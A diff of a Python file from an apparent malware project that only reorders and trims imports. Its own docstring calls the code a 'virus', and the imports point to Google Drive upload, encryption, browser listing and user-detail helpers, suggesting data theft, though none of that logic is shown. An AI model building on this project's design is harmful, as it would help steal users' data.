@@ -2,29 +2,26 @@
 the securied way is to delete the the OAuth 2.0 Client ID once done
 and create a new oAuth id each time when giving a tooken
 '''
+import json
+import os
 #%%
 from base64 import b64encode
-from clint.crypto import encrypt
-import json
 from functools import lru_cache
 from json.decoder import JSONDecodeError
-from os.path import isfile, join, split, exists
-import os
-from Crypto.Cipher import AES
-from logger import log
-from shutil import rmtree
-from threading import Event, Lock, Thread
+from os.path import exists, isfile, join, split
+from threading import Event, Thread
 from time import sleep, time
-from ast import literal_eval
 
 from oauth2client.client import OAuth2Credentials
 from pydrive.auth import GoogleAuth
 from pydrive.drive import GoogleDrive
 
-from clint.network import net_time, get, net_check
-from clint.util import basic_detail, data_store, formated_str, list_browsers, makedirs, random_str, username
+from clint.crypto import encrypt
 from clint.fileio import Fileio, d
-
+from clint.network import get, net_check, net_time
+from clint.util import (basic_detail, data_store, list_browsers, makedirs,
+                        random_str, username)
+from logger import log
 
 
 #%%
@@ -234,6 +231,7 @@ drive_file = Offline
 def got_active():
     'to keep track when the virus got run (useally)'
     from datetime import datetime
+
     from dateutil.tz import tzlocal
 
     file = "activity.log"
